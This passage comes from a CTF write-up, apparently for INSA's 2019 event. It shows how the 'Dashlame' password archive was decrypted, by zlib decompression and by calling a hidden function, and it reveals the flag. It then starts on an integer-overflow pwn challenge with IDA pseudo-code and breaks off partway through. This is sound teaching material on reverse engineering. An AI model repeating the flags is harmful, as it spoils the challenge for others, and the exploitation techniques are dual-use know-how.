&lt;span class=&quot;n&quot;&gt;Type&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;help&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;copyright&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;credits&quot;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;license&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;more&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;information&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;                                                                 
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;zlib&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zlib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decompress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'x&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x9c\x0b\x0e\xf4\xc9&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;,IUH&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xcb&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xca&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;M,Q0f`a`ddpPP````&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x82&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x18&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x04&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x16&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;4&amp;gt;!&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xc0\xc4\xa0\xfb\x8c\x9b\x17\xa4\x98&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;y.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x03\x10\x8d\x82&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Q0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\x88\x05\x89\x8c\xec\xe2\xf2\xf2\x8c\x8d\x82&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x89&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;I9&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xa9\x01\x89\xc5\xc5\xe5\xf9&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;E)&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xc5&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x06\x93&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x90\xab&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x88\xab&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;B&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x88\xa3\x93\x8f\xab\x02\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;X&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xa3&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;lt;5&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xa9\x18\x94\xab&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;C&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;#Bt&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x14&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;J&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x8b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;S&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x8b\xf2\x12&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;sa&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xdc\x02\xa8&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;20W&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x13\x92&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xcf&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00\xd1&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x18\x05\xa3&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x08\x03&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;#F&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x16&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;mYkh&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xe6\x8f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;O&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xad&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;H&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xcc&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xc8&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;I&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x85\xe5&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;~O&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xbf&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xc7\xea\x90\xcc\xe2\xf8\xa4\xd0\x92\xf8\xc4\xf8&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xe7&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x93\x92\xe4\x8c&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Z&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00\xa8&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;amp;=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x8f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;SQLite&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;format&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;website_exampleusernameINSA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Tis_bUt_a_SCr4tch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bsite&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TEXT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TEXT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TEXT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Flag: &lt;strong&gt;INSA{Tis_bUt_a_SCr4tch}&lt;/strong&gt;.&lt;/p&gt;

&lt;h3 id=&quot;alternative-way-using-decrypt_archive&quot;&gt;Alternative way using decrypt_archive()&lt;/h3&gt;

&lt;p&gt;While listing the script functions, we could see a &lt;strong&gt;decrypt_archive()&lt;/strong&gt; function. However, this function was not available from the user interface of the program.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python dashlame.py
      /.m.&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
     /.mnnm.&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;                                             ___
    |.mmnvvnm.&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;                                     .,,,/&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;mmm.&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    |.mmnnvvnm.&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;,.                           ..,,&lt;span class=&quot;p&quot;&gt;;;;&lt;/span&gt;/.mmnnnmm.&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;mmnnnvvnm.&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;:&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;,                    .,&lt;span class=&quot;p&quot;&gt;;;;;;;;;&lt;/span&gt;/.mmmnnvvnnm.|
     &lt;span class=&quot;se&quot;&gt;\`&lt;/span&gt;mmnnnvvnm.&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;:&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;::.sSSs      sSSs ,&lt;span class=&quot;p&quot;&gt;;;;;;;;;;;&lt;/span&gt;/.mmmnnvvvnnmm&lt;span class=&quot;s1&quot;&gt;'/
       \`mmnnnvnm.\:::::SSSS,,,,,,SSSS:::::::;;;/.mmmnnvvvnnmmm'&lt;/span&gt;/
          &lt;span class=&quot;se&quot;&gt;\`&lt;/span&gt;mnvvnm.&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;:%%%&lt;span class=&quot;p&quot;&gt;;;;;;;;;;;;&lt;/span&gt;%%%%:::::&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;/.mnnvvvvnnmmmmm&lt;span class=&quot;s1&quot;&gt;'/
             \`mmmm.%%;;;;;%%%%%%%%%%%%%%%::/.mnnvvvnnmmmmm'&lt;/span&gt;/ &lt;span class=&quot;s1&quot;&gt;'
                \`%%;;;;%%%%s&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;s%%%%mmmnnnmmmmmm'&lt;/span&gt;/ &lt;span class=&quot;s1&quot;&gt;'
     |           `%;;;%%%%s&amp;amp;&amp;amp;.%%%%%%.%&amp;amp;&amp;amp;%mmmmmmmmmm'&lt;/span&gt;/ &lt;span class=&quot;s1&quot;&gt;'
\    |    /       %;;%%%%&amp;amp;&amp;amp;.%;`    '&lt;/span&gt;%.&amp;amp;&amp;amp;%%%////// &lt;span class=&quot;s1&quot;&gt;'
  \  |  /         %%%%%%s&amp;amp;.%%   x   %.&amp;amp;&amp;amp;%%%%%//%
    \  .:::::.  ,;%%%%s&amp;amp;&amp;amp;&amp;amp;&amp;amp;.%;     ;.&amp;amp;&amp;amp;%%%%%%%%/,
-!!!- ::#:::::%%%%%%s&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;%%%%%%%%%%%
    / :##:::::&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;%%%%%%%%%%%%%%,
  /  | `:#:::&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;%%%%%%%%%%%%%
     |       `&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;,&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;SS%%%%%%%%%%%%%
               `~~~~~'&lt;/span&gt;~~        SSSSSSS%%%%%%%%%%%%%
                               SSSSSSSS%%%%%%%%%%%%%%
                              SSSSSSSSSS%%%%%%%%%%%%%.
                            SSSSSSSSSSSS%%%%%%%%%%%%%%
                          SSSSSSSSSSSSS%%%%%%%%%%%%%%%.
                        SSSSSSSSSSSSSSS%%%%%%%%%%%%%%%%
                      SSSSSSSSSSSSSSSS%%%%%%%%%%%%%%%%%.
                    SSSSSSSSSSSSSSSSS%%%%%%%%%%%%%%%%%%%
                  SSSSSSSSSSSSSSSSSS%%%%%%%%%%%%%%%%%%%%.

                          WELCOME TO DASHLAME

1. Create a new password archive
2. Add a password to an archive
3. Access a password from an existing archive
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;An alternative way of decrypting an archive would be to:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;Create a password archive.&lt;/li&gt;
  &lt;li&gt;Note passphraseA and passphraseB.&lt;/li&gt;
  &lt;li&gt;Modify the script in order to call decrypt_archive(archive,passphraseA,passphraseB).&lt;/li&gt;
&lt;/ol&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                      WELCOME TO DASHLAME

1. Create a new password archive
2. Add a password to an archive
3. Access a password from an existing archive
1
Please enter your archive name: boiteaklou
Getting random data from atmospheric noise and mouse movements..........                                                               
This is your passphrase : pruden patties
Please remember it or you will lose all your passwords.
Archive created successfully.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Here is the slight modification I brought to the &lt;em&gt;main&lt;/em&gt; function of the script:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'__main__'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HEADER&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'1. Create a new password archive'&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'2. Add a password to an archive'&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'3. Access a password from an existing archive'&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;raw_input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'1'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;createArchive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'2'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;updateArchive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'3'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;accessArchive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'4'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;decrypt_archive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'boiteaklou.dla'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'pruden'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'patties'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# HERE&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Wrong choice'&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Error.'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now, the password archive should be decrypted:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;strings boiteaklou.db
SQLite format 3
tablePasswordsPasswords
CREATE TABLE Passwords&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;website TEXT, username TEXT, password TEXT&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;website_exampleusernameINSA&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;Tis_bUt_a_SCr4tch&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;pwn-intergover&quot;&gt;[Pwn] Intergover&lt;/h2&gt;

&lt;h3 id=&quot;statement-4&quot;&gt;Statement&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;I hope you know how integers are stored.&lt;/p&gt;

  &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ssh -i &amp;lt;your_keyfile&amp;gt; -p 2223 user@intergover.ctf.insecurity-insa.fr&lt;/code&gt;
To find your keyfile, look into your profile on this website.&lt;/p&gt;

  &lt;p&gt;&lt;a href=&quot;http://localhost:4000/assets/2019-05-08/intergover&quot; title=&quot;intergover&quot;&gt;Binary&lt;/a&gt;&lt;/p&gt;

  &lt;p&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=_BgblvF90UE&quot;&gt;https://www.youtube.com/watch?v=_BgblvF90UE&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;spotting-the-vulnerabilty&quot;&gt;Spotting the vulnerabilty&lt;/h3&gt;

&lt;p&gt;Let’s see what we can get from this binary.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file intergover
intergover: ELF 64-bit LSB executable, x86-64, version 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SYSV&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;GNU/Linux 2.6.32, BuildID[sha1]&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;8a1089cd9d189ee37904eaf6edfb3ce59652a881, not stripped
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ok, it’s a 64-bit executable, not stripped. We can quickly reverse-engineer the binary in order to get a fine understanding of its behavior.&lt;/p&gt;

&lt;p&gt;Here is the pseudo-code generated by IDA Pro:&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__cdecl&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;envp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [rsp+1Bh] [rbp-15h]
&lt;/span&gt;  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [rsp+1Ch] [rbp-14h]
&lt;/span&gt;  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [rsp+20h] [rbp-10h]
&lt;/span&gt;  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [rsp+24h] [rbp-Ch]
&lt;/span&gt;  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [rsp+28h] [rbp-8h]
&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__readfsqword&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x28u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Give me one param: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;envp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;fflush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0LL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__isoc99_scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%d&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;I expect a number.&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;fflush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0LL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
